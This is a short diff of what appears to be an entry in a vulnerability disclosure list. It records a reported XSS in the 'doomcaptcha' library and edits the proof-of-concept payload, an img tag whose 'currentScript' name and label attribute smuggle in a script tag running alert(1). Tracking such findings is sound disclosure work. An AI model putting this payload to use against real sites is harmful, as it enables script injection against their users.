@@ -5,7 +5,7 @@
 + Library: doomcaptcha
 + Stars: 1K
 + Version: latest
-+ Payload: ```<img name="currentScript" label="<script>alert(1)</script>"></img>```
++ Payload: ```<img name="currentScript" label="<script>alert(1)</script>">```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
